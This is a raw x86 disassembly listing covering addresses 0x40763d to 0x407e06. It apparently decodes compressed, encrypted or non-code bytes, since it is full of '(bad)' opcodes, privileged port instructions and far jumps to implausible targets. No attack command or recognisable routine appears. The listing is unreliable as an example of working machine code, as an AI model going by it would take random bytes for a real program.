  40763d:	cmp    DWORD PTR [eax+esi*1+0x18],esp
  407641:	mov    dl,0x31
  407643:	sbb    cl,dl
  407645:	sbb    ebp,DWORD PTR [eax+edx*4+0x24]
  407649:	sub    eax,0x396ad5a
  40764e:	pop    es
  40764f:	outs   dx,DWORD PTR ds:[esi]
  407650:	es pop eax
  407652:	rcr    BYTE PTR [eax],0x1f
  407655:	mov    dl,0x14
  407657:	xchg   edx,eax
  407658:	lds    esp,FWORD PTR [ebx+0x1544e8b9]
  40765e:	into   
  40765f:	cmp    al,0x82
  407661:	and    eax,0x556fb51c
  407666:	fnstcw WORD PTR [ebx]
  407668:	in     al,dx
  407669:	push   ebx
  40766a:	inc    edx
  40766b:	or     BYTE PTR ds:0x718071b4,al
  407671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407672:	add    DWORD PTR [eax],edx
  407674:	loopne 0x4076b6
  407676:	bound  eax,QWORD PTR [edx]
  407678:	pop    esp
  407679:	add    DWORD PTR [esi-0x340d0342],ebp
  40767f:	outs   dx,DWORD PTR ds:[esi]
  407680:	loope  0x407694
  407682:	mov    dl,0x2e
  407684:	or     esp,DWORD PTR [ecx]
  407686:	add    DWORD PTR cs:[edi],ebp
  407689:	add    edx,edi
  40768b:	sub    esp,0x589e2789
  407691:	(bad)  
  407692:	retf   
  407693:	mov    eax,0xc0035947
  407698:	xor    DWORD PTR [ecx+edx*2],esp
  40769b:	jmp    0xe3c4:0x3f75a94c
  4076a2:	add    ecx,DWORD PTR [ebx]
  4076a4:	adc    BYTE PTR [edx+0x60],al
  4076a7:	mov    ecx,fs
  4076a9:	retf   0xdbd5
  4076ac:	push   0xd98f73b3
  4076b1:	adc    eax,0x42660771
  4076b6:	loopne 0x4076d7
  4076b8:	adc    BYTE PTR [eax],ah
  4076ba:	mov    ch,0xdb
  4076bc:	inc    esi
  4076bd:	loop   0x4076c0
  4076bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076c0:	out    0xc3,eax
  4076c2:	jnp    0x40764e
  4076c4:	push   edx
  4076c5:	daa    
  4076c6:	int3   
  4076c7:	mov    ah,0x84
  4076c9:	mov    ecx,0x2adc8bf
  4076ce:	inc    esp
  4076cf:	dec    esi
  4076d0:	mov    ds:0x68c89472,al
  4076d5:	daa    
  4076d6:	sti    
  4076d7:	je     0x407733
  4076d9:	jnp    0x4076cf
  4076db:	pop    edx
  4076dc:	pop    es
  4076dd:	or     al,0x7a
  4076df:	xlat   BYTE PTR ds:[ebx]
  4076e0:	sbb    esi,esi
  4076e2:	into   
  4076e3:	mov    bl,0xd1
  4076e5:	fwait
  4076e6:	mov    cl,0xb3
  4076e8:	sub    eax,ebx
  4076ea:	fisubr DWORD PTR [ebx+esi*1+0x1a]
  4076ee:	neg    cl
  4076f0:	fcomp  QWORD PTR [eax+esi*4]
  4076f3:	mov    bl,0xbd
  4076f5:	leave  
  4076f6:	jo     0x40769b
  4076f8:	iret   
  4076f9:	push   0x3468c1b4
  4076fe:	inc    eax
  4076ff:	dec    edx
  407700:	mov    DWORD PTR [edx+0x9],edx
  407703:	inc    edx
  407704:	mov    ch,0x91
  407706:	xor    al,BYTE PTR [ecx+0x48]
  407709:	adc    DWORD PTR [edx-0x73b5bdd7],0xc41815b1
  407713:	dec    esi
  407714:	enter  0x4f95,0x75
  407718:	pop    ss
  407719:	adc    BYTE PTR [eax-0x2b],dh
  40771c:	div    BYTE PTR [esi+0xc050e4c]
  407722:	and    DWORD PTR [ecx+0x15c9f6b5],0xe053100
  40772c:	sub    DWORD PTR [ebx],0xeafabeaf
  407732:	jns    0x407770
  407734:	cmp    al,ah
  407736:	jl     0x40774a
  407738:	scas   eax,DWORD PTR es:[edi]
  407739:	jecxz  0x407713
  40773b:	les    ecx,FWORD PTR [eax+ebp*1]
  40773e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40773f:	xchg   esp,eax
  407740:	lds    esp,FWORD PTR [ebx-0x71]
  407743:	cmp    eax,0xb0668eb6
  407748:	push   es
  407749:	and    BYTE PTR [ebx+0x49],0x91
  40774d:	out    0x3f,eax
  40774f:	and    eax,0x60ab6885
  407754:	add    al,BYTE PTR [eax]
  407756:	or     BYTE PTR [ecx-0x1b3675ae],al
  40775c:	nop
  40775d:	fstp   TBYTE PTR [ebx-0x70b551e7]
  407763:	jb     0x407714
  407765:	sbb    eax,0x99b28257
  40776a:	jmp    0x5:0xb1d2885a
  407771:	inc    edx
  407772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407773:	fldenv [ecx-0x6d4b5edc]
  407779:	sub    al,0x57
  40777b:	sbb    al,0xe4
  40777d:	(bad)  
  40777e:	(bad)  
  40777f:	jbe    0x4077b6
  407781:	mov    BYTE PTR [edx],al
  407783:	sub    DWORD PTR [ebx-0x5c],ecx
  407786:	sub    BYTE PTR [ecx+0x272a4e62],dl
  40778c:	and    al,0x6a
  40778e:	dec    edx
  40778f:	daa    
  407790:	sub    eax,0xfa4bb4e8
  407795:	fstp   QWORD PTR [ebx+0x30aef46c]
  40779b:	sbb    dl,BYTE PTR [esp+ecx*4-0x3ca4dafa]
  4077a2:	mov    WORD PTR [ebp+0x7bf430d],gs
  4077a8:	mov    ebp,0x6830628e
  4077ad:	mov    bl,0x39
  4077af:	fisub  DWORD PTR [eax+0x1a30183f]
  4077b5:	ins    DWORD PTR es:[edi],dx
  4077b6:	mov    cl,0xb1
  4077b8:	mov    cl,0x49
  4077ba:	xchg   edx,eax
  4077bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077bc:	dec    eax
  4077bd:	xchg   ebp,eax
  4077be:	loopne 0x4077f2
  4077c0:	and    DWORD PTR ds:0x343ee7d6,eax
  4077c6:	add    DWORD PTR [edx-0x490e0f57],esp
  4077cc:	clc    
  4077cd:	not    DWORD PTR [ecx+0x0]
  4077d0:	jno    0x407826
  4077d2:	mov    ecx,0x80f5f623
  4077d7:	push   ds
  4077d8:	jo     0x4077e4
  4077da:	clc    
  4077db:	jo     0x407780
  4077dd:	dec    eax
  4077de:	mov    DWORD PTR [ebx],eax
  4077e0:	mov    BYTE PTR [ecx],bl
  4077e2:	mov    al,0x67
  4077e4:	lods   eax,DWORD PTR ds:[esi]
  4077e5:	mov    ebp,0x6f1bc6f5
  4077ea:	mov    WORD PTR [ebp-0x77bd78f0],es
  4077f0:	fild   DWORD PTR [edx-0x78]
  4077f3:	jge    0x407791
  4077f5:	lahf   
  4077f6:	loop   0x407825
  4077f8:	sub    ebp,esp
  4077fa:	fwait
  4077fb:	sar    BYTE PTR [ecx-0x41],0x7d
  4077ff:	jb     0x4077ef
  407801:	fdivr  QWORD PTR [ecx]
  407803:	ret    
  407804:	lahf   
  407805:	arpl   WORD PTR [ecx+0x3],bx
  407808:	shl    BYTE PTR [ecx],0x44
  40780b:	sar    BYTE PTR [ebx-0x5c],0x94
  40780f:	dec    eax
  407810:	lahf   
  407811:	(bad)  
  407812:	sbb    edi,ebx
  407814:	add    BYTE PTR [esi],cl
  407816:	cmpxchg8b QWORD PTR [esi+eiz*2+0x12]
  40781b:	lods   al,BYTE PTR ds:[esi]
  40781c:	jp     0x407835
  40781e:	repz sub ecx,DWORD PTR ds:0xc7040958
  407825:	popf   
  407826:	aaa    
  407827:	xor    edx,DWORD PTR [eax]
  407829:	and    BYTE PTR [edi+ebx*8-0x1ab63412],dh
  407830:	mov    bh,0x3b
  407832:	aas    
  407833:	test   BYTE PTR [ecx+0x3722ac0a],dh
  407839:	adc    dh,BYTE PTR [esp+eiz*2+0x2870133f]
  407840:	rcr    BYTE PTR [edx],0xef
  407843:	or     BYTE PTR [esp+ecx*2+0x42],dh
  407847:	leave  
  407848:	sub    DWORD PTR [ecx-0x395c5bc6],ecx
  40784e:	je     0x4078aa
  407850:	sti    
  407851:	mov    WORD PTR [edx-0x49],?
  407854:	fcomp  st(2)
  407856:	mov    eax,0x12e0d6c9
  40785b:	fwait
  40785c:	sbb    ebx,DWORD PTR [edx+0x27042733]
  407862:	dec    edi
  407863:	je     0x40787e
  407865:	outs   dx,BYTE PTR ds:[esi]
  407866:	je     0x407841
  407868:	ficomp WORD PTR [edx]
  40786a:	xor    bl,BYTE PTR [esi+esi*8]
  40786d:	jmp    0x64d33e8
  407872:	add    edi,edx
  407874:	std    
  407875:	and    DWORD PTR [edx+0x25],edx
  407878:	dec    eax
  407879:	test   eax,0x21049248
  40787e:	pop    esp
  40787f:	fiadd  WORD PTR [ebx+0x45130631]
  407885:	sub    ebp,esi
  407887:	(bad)  
  407888:	and    bl,BYTE PTR [edx-0x3bfea91b]
  40788e:	xor    DWORD PTR [ebp-0x6d],ecx
  407891:	inc    esp
  407892:	or     BYTE PTR [ecx],dh
  407894:	les    esi,FWORD PTR [ecx]
  407896:	mov    bl,dl
  407898:	inc    edi
  407899:	pop    ebp
  40789a:	mov    edi,0x9cb8e1
  40789f:	scas   eax,DWORD PTR es:[edi]
  4078a0:	pop    esp
  4078a1:	mov    ecx,0x9c2de572
  4078a6:	jecxz  0x40789a
  4078a8:	stos   BYTE PTR es:[edi],al
  4078a9:	adc    dl,ah
  4078ab:	sti    
  4078ac:	ficomp WORD PTR [edi]
  4078ae:	jno    0x407909
  4078b0:	or     BYTE PTR [ecx-0x361b0d81],dh
  4078b6:	pop    ds
  4078b7:	sti    
  4078b8:	mov    al,0xe7
  4078ba:	sbb    al,BYTE PTR [eax]
  4078bc:	mov    fs,WORD PTR [ecx]
  4078be:	push   edx
  4078bf:	test   eax,0xe5a7c107
  4078c4:	add    cl,BYTE PTR [eax]
  4078c6:	add    DWORD PTR ds:0x49800054,0xdf95eb89
  4078d0:	imul   esp,DWORD PTR [edi-0xe7be7ef],0xe7bb7be7
  4078da:	or     dl,0xbc
  4078dd:	or     bl,bl
  4078df:	test   al,dh
  4078e1:	or     al,0xc2
  4078e3:	sti    
  4078e4:	pop    ds
  4078e5:	lods   al,BYTE PTR ds:[esi]
  4078e6:	add    cl,dl
  4078e8:	add    dl,cl
  4078ea:	add    DWORD PTR [edx+ebx*1],esp
  4078ed:	add    DWORD PTR [esi],0x9fd92d32
  4078f3:	or     DWORD PTR [esi-0x4729791b],ebp
  4078f9:	mov    al,ds:0xe8d9ced7
  4078fe:	pop    ss
  4078ff:	in     al,dx
  407900:	fcomp  QWORD PTR [edx-0x378f45cf]
  407906:	inc    esi
  407907:	ja     0x40794b
  407909:	mov    edi,0x3bc0c073
  40790e:	sub    al,0x3b
  407910:	jmp    0x8d1d7f3a
  407915:	lea    eax,[ecx+0x184ddfa0]
  40791b:	push   cs
  40791c:	sti    
  40791d:	or     al,0x7a
  40791f:	sbb    eax,0x830ebd7a
  407924:	inc    BYTE PTR [eax+0x2108e18d]
  40792a:	adc    eax,0x5448492a
  40792f:	adc    BYTE PTR [eax-0x4a581e36],0x18
  407936:	mov    ebx,0x58a3e050
  40793b:	inc    esp
  40793c:	in     eax,dx
  40793d:	leave  
  40793e:	mov    ?,WORD PTR [eax]
  407940:	sbb    eax,0xc4626b8e
  407945:	adc    ch,BYTE PTR [esi+0x42918c6d]
  40794b:	mov    BYTE PTR [esi],bh
  40794d:	rol    bh,1
  40794f:	mov    cl,0x89
  407951:	lahf   
  407952:	imul   ebx,DWORD PTR [ebx+esi*1-0x3f9bbde9],0xde6f375b
  40795d:	jl     0x40796a
  40795f:	bound  ebx,QWORD PTR [si+0x5297]
  407964:	mov    esi,0x8021c1ee
  407969:	lds    edi,FWORD PTR [eax+edi*1+0x1c]
  40796d:	dec    al
  40796f:	fwait
  407970:	sbb    DWORD PTR [ebx+0x0],ebp
  407973:	mov    eax,0xcfddf947
  407978:	jge    0x4079c8
  40797a:	sbb    BYTE PTR [ebx-0x22],ah
  40797d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40797e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40797f:	je     0x4079ca
  407981:	inc    eax
  407982:	fisub  WORD PTR [ebx+0x521012e]
  407988:	jnp    0x407a05
  40798a:	pop    es
  40798b:	mov    WORD PTR [edi],cs
  40798d:	adc    ebp,esi
  40798f:	lods   eax,DWORD PTR ds:[esi]
  407990:	outs   dx,DWORD PTR ds:[esi]
  407991:	cmp    eax,DWORD PTR [edx-0x54]
  407994:	out    dx,eax
  407995:	rol    ebx,0xff
  407998:	ja     0x4079f7
  40799a:	mov    WORD PTR [edi],es
  40799c:	add    ecx,DWORD PTR ds:0xcace748
  4079a2:	pop    ss
  4079a3:	push   ss
  4079a4:	add    ah,BYTE PTR [ecx]
  4079a6:	inc    ecx
  4079a7:	leave  
  4079a8:	xchg   esp,eax
  4079a9:	push   esi
  4079aa:	mov    ebx,0xd11dd245
  4079af:	out    dx,al
  4079b0:	or     edi,DWORD PTR [edx]
  4079b2:	and    eax,DWORD PTR [ebp-0x45]
  4079b5:	shrd   DWORD PTR [esi],ebx,cl
  4079b8:	test   al,0xb6
  4079ba:	and    eax,0x25052597
  4079bf:	sti    
  4079c0:	mov    edx,0x8278c6e0
  4079c5:	sbb    al,0x8f
  4079c7:	ror    esp,0x10
  4079ca:	jbe    0x407a18
  4079cc:	dec    ebx
  4079cd:	mov    cs,WORD PTR [ecx+0x55]
  4079d0:	dec    esi
  4079d1:	cmp    edi,DWORD PTR [ecx-0x728a44b3]
  4079d7:	jle    0x4079f0
  4079d9:	cli    
  4079da:	mov    ebp,0x8751cd84
  4079df:	inc    ecx
  4079e0:	pop    edi
  4079e1:	ror    DWORD PTR [esi+0x2d],1
  4079e4:	lods   eax,DWORD PTR ds:[esi]
  4079e5:	xchg   esi,eax
  4079e6:	mov    ds:0xd2b452dd,al
  4079eb:	test   BYTE PTR [ecx*2+0x6d33985c],ah
  4079f2:	cmp    DWORD PTR [esi],edx
  4079f4:	mov    eax,ds:0x569a5412
  4079f9:	dec    esp
  4079fa:	mov    ds:0x9b5459f9,al
  4079ff:	push   ebx
  407a00:	out    dx,al
  407a01:	cwde   
  407a02:	sbb    DWORD PTR [edi+esi*8],esi
  407a05:	xor    eax,0xb1df87bf
  407a0a:	xor    al,0x81
  407a0c:	and    al,0xde
  407a0e:	push   ds
  407a0f:	or     DWORD PTR [ebx-0x35],0x3e02db5a
  407a16:	or     BYTE PTR [eax+esi*1+0x6],bh
  407a1a:	sub    eax,0xb1c58421
  407a1f:	xchg   DWORD PTR [ebx-0x40],ebx
  407a22:	lds    eax,FWORD PTR [ebx+0x528b8383]
  407a28:	retf   0xc00b
  407a2b:	adc    eax,0x1c6e6f
  407a30:	mov    ebx,0x9038e4de
  407a35:	push   edx
  407a36:	out    dx,al
  407a37:	jecxz  0x4079fb
  407a39:	sahf   
  407a3a:	pop    ecx
  407a3b:	stos   DWORD PTR es:[edi],eax
  407a3c:	aad    0xfa
  407a3e:	mov    eax,ds:0xd72e38
  407a43:	jo     0x4079d4
  407a45:	push   edx
  407a46:	push   0xffffffdd
  407a48:	dec    ecx
  407a49:	xchg   esp,eax
  407a4a:	jp     0x407a16
  407a4c:	pop    edx
  407a4d:	mov    ecx,DWORD PTR [edx+0x12]
  407a50:	dec    esp
  407a51:	pop    ecx
  407a52:	mov    edx,0xd14d3fde
  407a57:	pop    edx
  407a58:	jae    0x407a4f
  407a5a:	fisubr DWORD PTR ds:0x97d0d966
  407a60:	mov    esi,0xcaf01817
  407a65:	lods   ax,WORD PTR ds:[esi]
  407a67:	push   edi
  407a68:	mov    esp,0xd754901f
  407a6d:	mov    eax,DWORD PTR [esi+0x1d]
  407a70:	lods   al,BYTE PTR ds:[esi]
  407a71:	add    al,0x1c
  407a73:	aaa    
  407a74:	ds inc ecx
  407a76:	dec    ecx
  407a77:	inc    ebx
  407a78:	call   0x86d6:0xcd6dba08
  407a7f:	loop   0x407a02
  407a81:	xchg   ebx,eax
  407a82:	xchg   esi,eax
  407a83:	adc    ebx,DWORD PTR [ebx-0x7e]
  407a86:	int    0x21
  407a88:	ins    BYTE PTR es:[edi],dx
  407a89:	ins    BYTE PTR es:[edi],dx
  407a8a:	or     dl,dl
  407a8c:	and    al,0xc5
  407a8e:	xchg   edx,eax
  407a8f:	mov    ds:0x1ca29775,al
  407a94:	push   edx
  407a95:	call   0xf25b0f4d
  407a9a:	adc    cl,BYTE PTR [edx-0x4cf2f5ee]
  407aa0:	adc    cl,dl
  407aa2:	mov    ds:0x9415ecc4,al
  407aa7:	aaa    
  407aa8:	dec    ebx
  407aa9:	dec    esp
  407aaa:	cdq    
  407aab:	and    ebp,ebp
  407aad:	cwde   
  407aae:	push   esp
  407aaf:	into   
  407ab0:	dec    eax
  407ab1:	aad    0x9c
  407ab3:	outs   dx,BYTE PTR ds:[esi]
  407ab4:	mov    edx,0x27dd374f
  407ab9:	xchg   ebp,eax
  407aba:	jae    0x407af6
  407abc:	jmp    0x6772d155
  407ac1:	rcl    BYTE PTR [ebx+0x6c],1
  407ac4:	or     al,0x5a
  407ac6:	or     al,0xfa
  407ac8:	pop    ebp
  407ac9:	jp     0x407aa8
  407acb:	cs in  eax,dx
  407acd:	dec    esi
  407ace:	fwait
  407acf:	shl    DWORD PTR [eax+0x48],0x7f
  407ad3:	xor    BYTE PTR [eax],ah
  407ad5:	dec    ecx
  407ad6:	sbb    al,0x28
  407ad8:	and    al,0x49
  407ada:	adc    BYTE PTR [edx+0x9],0xd6
  407ade:	sbb    dh,BYTE PTR [esi+esi*1-0x47fa4db9]
  407ae5:	jae    0x407a8b
  407ae7:	and    bh,ah
  407ae9:	setns  BYTE PTR [eax-0x876dfb3]
  407af0:	sbb    eax,0x2e308be5
  407af5:	in     eax,0x5b
  407af7:	dec    eax
  407af8:	sub    DWORD PTR [ebx-0x4f5e1dd1],eax
  407afe:	pop    ebp
  407aff:	cli    
  407b00:	adc    al,0xf0
  407b02:	call   0xe148d5e3
  407b07:	jecxz  0x407ac7
  407b09:	dec    esp
  407b0a:	or     ebx,0x115c5145
  407b10:	inc    edx
  407b11:	mov    esp,0x97146384
  407b16:	jl     0x407ace
  407b18:	in     eax,0xcb
  407b1a:	pop    ss
  407b1b:	cs pop esp
  407b1d:	cmp    BYTE PTR [eax-0x1c],bh
  407b20:	xchg   ecx,eax
  407b21:	inc    edi
  407b22:	fidiv  WORD PTR [ebp+0x6b9ed1]
  407b28:	mov    eax,0xdbb56947
  407b2d:	daa    
  407b2e:	xor    BYTE PTR [esi+0x47],ah
  407b31:	js     0x407ada
  407b33:	lahf   
  407b34:	cmc    
  407b35:	jns    0x407b33
  407b37:	and    edi,esp
  407b39:	jmp    esi
  407b3b:	int    0x5d
  407b3d:	(bad)
  407b43:	sbb    bh,BYTE PTR gs:[edi-0x59]
  407b47:	fdivr  QWORD PTR [ebx+0x6b8d29fb]
  407b4d:	push   esp
  407b4e:	retf   0x36fd
  407b51:	scas   eax,DWORD PTR es:[edi]
  407b52:	out    dx,eax
  407b53:	xchg   BYTE PTR [eax],dl
  407b55:	nop
  407b56:	sub    BYTE PTR [ecx-0x59],al
  407b59:	add    eax,ebx
  407b5b:	or     eax,0x9f74d9d8
  407b60:	lods   eax,DWORD PTR ds:[esi]
  407b61:	adc    DWORD PTR [esp+ebx*4+0x6b0c301f],esi
  407b68:	mov    al,ds:0x42cda034
  407b6d:	stc    
  407b6e:	mov    ch,0x71
  407b70:	push   ebx
  407b72:	xor    ah,BYTE PTR [ecx+0x40da09d0]
  407b78:	pop    esi
  407b79:	inc    eax
  407b7a:	pop    esi
  407b7b:	out    dx,al
  407b7c:	mov    eax,0x141c0532
  407b81:	mov    al,0x67
  407b83:	dec    edx
  407b84:	dec    esp
  407b85:	test   eax,0x8a19f391
  407b8a:	or     DWORD PTR [edx+0x77],ebp
  407b8d:	and    dl,0x90
  407b90:	xchg   esi,eax
  407b91:	mov    eax,0xd21d4745
  407b96:	dec    esi
  407b97:	daa    
  407b98:	hlt    
  407b99:	pop    edx
  407b9a:	xchg   edi,eax
  407b9b:	jmp    0x8f1db544
  407ba0:	mov    al,ds:0xe194bdf
  407ba5:	cli    
  407ba6:	je     0x407b62
  407ba8:	ins    DWORD PTR es:[edi],dx
  407ba9:	cmp    ch,ch
  407bab:	push   cs
  407bac:	sbb    eax,ebx
  407bae:	and    ebp,ebx
  407bb0:	outs   dx,BYTE PTR ds:[esi]
  407bb1:	lahf   
  407bb2:	push   esi
  407bb3:	retf   
  407bb4:	mov    cl,0x7
  407bb6:	xchg   ebp,eax
  407bb7:	and    al,0x28
  407bb9:	jmp    0x3786adba
  407bbe:	push   es
  407bbf:	push   0xc2b5b5c5
  407bc4:	scas   eax,DWORD PTR es:[edi]
  407bc5:	mov    al,0x54
  407bc7:	add    eax,0x32777d8d
  407bcc:	cmp    DWORD PTR [esi-0x63],edx
  407bcf:	ret    
  407bd0:	inc    esp
  407bd1:	add    edi,DWORD PTR [ecx-0x529a8684]
  407bd7:	push   ebp
  407bd8:	(bad)  
  407bd9:	cwde   
  407bda:	mov    dh,0x94
  407bdc:	jb     0x407c3e
  407bde:	lods   eax,DWORD PTR ds:[esi]
  407bdf:	cmp    eax,0xf014fc05
  407be4:	mov    esp,ecx
  407be6:	pop    edx
  407be7:	inc    edx
  407be8:	or     BYTE PTR [ebx],al
  407bea:	dec    esp
  407beb:	(bad)  
  407bec:	jecxz  0x407bdf
  407bee:	in     eax,0xaf
  407bf0:	jge    0x407bdf
  407bf2:	imul   edi,DWORD PTR [edi-0x14a9521],0xffffffd9
  407bf9:	ror    DWORD PTR [edi+0x3f],cl
  407bfc:	jge    0x407bdf
  407bfe:	js     0x407c2f
  407c00:	out    dx,eax
  407c01:	out    dx,al
  407c02:	mov    dl,0x6
  407c04:	cmp    BYTE PTR [ebx+0x14],0xa3
  407c08:	cmc    
  407c09:	jnp    0x407baf
  407c0b:	adc    ch,ch
  407c0d:	and    al,0x49
  407c0f:	nop
  407c10:	push   edx
  407c11:	and    ah,BYTE PTR [ebp-0x6d74a4bc]
  407c17:	adc    ch,BYTE PTR [esi+eiz*8+0x4a038dfa]
  407c1e:	jge    0x407bba
  407c20:	stos   BYTE PTR es:[edi],al
  407c21:	imul   DWORD PTR [edi-0xa]
  407c24:	stos   BYTE PTR es:[edi],al
  407c25:	out    dx,eax
  407c26:	lods   eax,DWORD PTR ss:[esi]
  407c28:	mov    bh,0x81
  407c2a:	into   
  407c2b:	(bad)  
  407c2c:	xlat   BYTE PTR ds:[ebx]
  407c2d:	mov    edi,0xd254177f
  407c32:	sub    DWORD PTR [ebx-0x41],edi
  407c35:	add    eax,ebx
  407c37:	add    DWORD PTR [ebp+ecx*1+0x61],ebp
  407c3b:	addr16 add al,0xed
  407c3e:	ss sub ch,ah
  407c41:	cs addr16 xor al,0x68
  407c45:	or     eax,esi
  407c47:	cmp    al,BYTE PTR [eax]
  407c49:	rcr    BYTE PTR [esi],1
  407c4b:	or     al,0xb4
  407c4d:	jbe    0x407c6f
  407c4f:	push   eax
  407c50:	cli    
  407c51:	std    
  407c52:	add    DWORD PTR [edx+ecx*2],ebx
  407c55:	sbb    eax,0x4eb401c0
  407c5a:	sub    BYTE PTR [edx+eax*2+0x56],cl
  407c5e:	mov    ah,0x29
  407c60:	cmc    
  407c61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c62:	fistp  DWORD PTR [edi-0x3e]
  407c65:	popa   
  407c66:	or     DWORD PTR [ebx-0x5d],esp
  407c69:	mov    cl,0xba
  407c6b:	test   cl,ch
  407c6d:	pushf  
  407c6e:	xchg   esp,eax
  407c6f:	inc    ebx
  407c70:	aam    0xc1
  407c72:	add    al,0xc5
  407c74:	xchg   esp,eax
  407c75:	mov    dh,0xb8
  407c77:	inc    ebp
  407c78:	dec    ebx
  407c79:	sbb    al,0xd2
  407c7b:	dec    esi
  407c7c:	imul   cl
  407c7e:	mov    ch,0xae
  407c80:	ror    DWORD PTR [edx+0x32],cl
  407c83:	fisubr DWORD PTR [ecx]
  407c85:	or     al,0x7a
  407c87:	ins    DWORD PTR es:[edi],dx
  407c88:	xchg   BYTE PTR [ebx],bl
  407c8a:	cmp    eax,0x6e949d3a
  407c8f:	mov    bh,0xcd
  407c91:	jo     0x407cf6
  407c93:	inc    eax
  407c94:	mov    bh,0xdb
  407c96:	mov    ds:0xb4b8eedd,eax
  407c9b:	push   0x22421121
  407ca0:	test   esp,esi
  407ca2:	mov    bl,0x39
  407ca4:	leave  
  407ca5:	stos   BYTE PTR es:[edi],al
  407ca6:	xchg   edi,eax
  407ca7:	or     al,BYTE PTR ds:[edx+eiz*2]
  407cab:	gs (bad) 
  407cae:	frstor [edx+eax*1+0x61]
  407cb2:	pop    edi
  407cb3:	sbb    BYTE PTR [edx+0x4efe3cdd],bh
  407cb9:	mov    esi,0x23001589
  407cbe:	mov    ch,0xd6
  407cc0:	sbb    esp,edi
  407cc2:	iret   
  407cc3:	lahf   
  407cc4:	jg     0x407d38
  407cc6:	ja     0x407d3f
  407cc8:	test   ecx,0xea7a9ea7
  407cce:	addr16 mov edi,0xfc6f8df1
  407cd4:	(bad)  
  407cd5:	dec    edi
  407cd6:	aas    
  407cd7:	std    
  407cd8:	hlt    
  407cd9:	or     esi,edi
  407cdb:	jmp    0xab7f75
  407ce0:	mov    eax,0x7f5a3167
  407ce5:	inc    eax
  407ce6:	dec    eax
  407ce7:	sub    DWORD PTR [ebp+0x4a55a94f],esp
  407ced:	mov    ecx,0xfb14ad97
  407cf2:	sti    
  407cf3:	mov    bh,0xb9
  407cf5:	mov    ebp,0x8ecac927
  407cfa:	add    BYTE PTR [bp+di],ch
  407cfd:	pop    es
  407cfe:	aad    0xdc
  407d00:	scas   eax,DWORD PTR es:[edi]
  407d01:	cmp    esp,DWORD PTR [ecx-0x3f]
  407d04:	sub    al,ah
  407d06:	frstor [ebx+0x15]
  407d09:	push   es
  407d0a:	mov    ebx,DWORD PTR [ebx]
  407d0c:	mov    cl,0x18
  407d0e:	push   es
  407d0f:	sub    ecx,DWORD PTR [ebx+0x1]
  407d12:	imul   ecx,DWORD PTR [edx],0xfa0c36dd
  407d18:	xor    BYTE PTR [edx],bl
  407d1a:	cmp    al,BYTE PTR [eax+0x50]
  407d1d:	push   0xffffff91
  407d1f:	sbb    BYTE PTR [ecx-0x44],ch
  407d22:	inc    ebp
  407d23:	popa   
  407d24:	or     al,0x94
  407d26:	(bad)  
  407d27:	jnp    0x407d29
  407d29:	add    ah,BYTE PTR [ebx-0x24]
  407d2c:	(bad)  
  407d2d:	shr    BYTE PTR [ebx],cl
  407d2f:	mov    edi,0x94318e31
  407d34:	jp     0x407cf7
  407d36:	push   ds
  407d37:	ret    0xd2be
  407d3a:	add    BYTE PTR cs:[edx+0x28d28a34],ah
  407d41:	repnz mov ds:0x5547a14d,al
  407d47:	cdq    
  407d48:	mov    ds:0xe58d284,al
  407d4d:	(bad)  
  407d4e:	out    0xa6,al
  407d50:	sub    DWORD PTR [eax],edx
  407d52:	xchg   BYTE PTR gs:[eax],ch
  407d55:	xor    cl,ah
  407d57:	cmp    BYTE PTR [ebx+0x5c],al
  407d5a:	popf   
  407d5b:	and    cl,BYTE PTR [esi+eax*2+0x22]
  407d5f:	or     bh,BYTE PTR [edx-0x17]
  407d62:	pushf  
  407d63:	outs   dx,BYTE PTR ds:[esi]
  407d64:	jp     0x407ce9
  407d66:	jbe    0x407dba
  407d68:	shr    BYTE PTR [ebx+0x69],cl
  407d6b:	cli    
  407d6c:	popf   
  407d6d:	xchg   edx,eax
  407d6e:	pop    esi
  407d6f:	retf   
  407d70:	ror    BYTE PTR [edx+0x5],1
  407d73:	in     eax,dx
  407d74:	xchg   esi,eax
  407d75:	and    cl,BYTE PTR [ebp+0x14]
  407d78:	dec    edx
  407d79:	sub    DWORD PTR [edx],edi
  407d7b:	popf   
  407d7c:	cs mov ebp,0xaf5e80fe
  407d82:	dec    edi
  407d83:	stos   DWORD PTR es:[edi],eax
  407d84:	fnsave [esi+0x26]
  407d87:	xchg   BYTE PTR [edi+0x13],ah
  407d8a:	mov    cl,0x92
  407d8c:	push   ds
  407d8d:	gs push esi
  407d8f:	test   ch,ch
  407d91:	ficomp WORD PTR [eax+ebp*4]
  407d94:	or     eax,0x43826aae
  407d99:	clc    
  407d9a:	push   ds
  407d9b:	pop    ds
  407d9c:	fild   WORD PTR [edx+eax*4]
  407d9f:	cmp    al,0xcf
  407da1:	(bad)  
  407da3:	fucom  st(5)
  407da5:	imul   ch
  407da7:	fistp  DWORD PTR [esp+edi*4+0x78]
  407dab:	icebp  
  407dac:	ret    
  407dad:	(bad)  
  407daf:	cld    
  407db0:	lock out 0x9e,eax
  407db3:	jnp    0x407da3
  407db5:	mov    ecx,0xc7d8fe5f
  407dba:	imul   BYTE PTR ds:[ebp-0x28690a05]
  407dc1:	add    BYTE PTR [eax-0x71],dh
  407dc4:	mov    ds:0x8c31e492,al
  407dc9:	jno    0x407e08
  407dcb:	ds out dx,al
  407dcd:	test   DWORD PTR [edx],ebp
  407dcf:	sub    DWORD PTR [ecx+0x52],edx
  407dd2:	jb     0x407e04
  407dd4:	fsubrp st(7),st
  407dd6:	neg    BYTE PTR [esi-0x21790640]
  407ddc:	mov    DWORD PTR [esp+ebp*2],esi
  407ddf:	jae    0x407e49
  407de1:	hlt    
  407de2:	in     al,0xf7
  407de4:	leave  
  407de5:	push   edi
  407de6:	adc    ah,bh
  407de8:	add    BYTE PTR ds:0xa42ad876,dl
  407dee:	mov    ecx,0x3ee02318
  407df3:	(bad)  
  407df4:	cmp    dh,BYTE PTR [edx-0x5f]
  407df7:	mov    ebp,0x845d62f2
  407dfc:	xor    DWORD PTR [ecx-0x30],edx
  407dff:	dec    esi
  407e00:	mov    eax,ds:0xa92482d3
  407e05:	xchg   ebx,eax
  407e06:	or     eax,0x31663b8b
